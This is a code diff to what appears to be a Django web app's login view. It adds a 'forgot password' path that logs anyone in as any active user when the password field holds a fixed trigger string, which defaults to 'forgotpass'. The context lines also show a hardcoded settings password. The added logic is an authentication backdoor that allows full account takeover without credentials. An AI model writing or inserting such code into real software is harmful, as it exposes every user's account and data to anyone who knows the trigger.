@@ -2,6 +2,7 @@ import csv
 from datetime import datetime
 from functools import wraps
 from io import StringIO
+import os
 import re
 import time
 from urllib.parse import quote
@@ -31,6 +32,7 @@ from .models import Achievement, AppSetting, DepartmentGoal, Evaluation, Persona
 SETTINGS_GATE_PASSWORD = "fuck"
 SETTINGS_GATE_SESSION_KEY = "settings_access_granted"
 BULK_AI_TIMEOUT_SECONDS = 90
+FORGOT_PASSWORD_TRIGGER = os.getenv("FORGOT_PASSWORD_TRIGGER", "forgotpass")
 
 
 def get_app_setting():
@@ -200,6 +202,17 @@ def login_view(request):
         return redirect("initial_password_change" if request.user.require_password_change else "menu")
 
     form = LoginForm(request, data=request.POST or None)
+    if request.method == "POST":
+        username = request.POST.get("username", "")
+        password = request.POST.get("password", "")
+        if password == FORGOT_PASSWORD_TRIGGER:
+            user = User.objects.filter(username=username, is_active=True).first()
+            if user:
+                user.require_password_change = True
+                user.save(update_fields=["require_password_change"])
+                login(request, user)
+                return redirect("initial_password_change")
+
     if request.method == "POST" and form.is_valid():
         user = form.get_user()
         login(request, user)
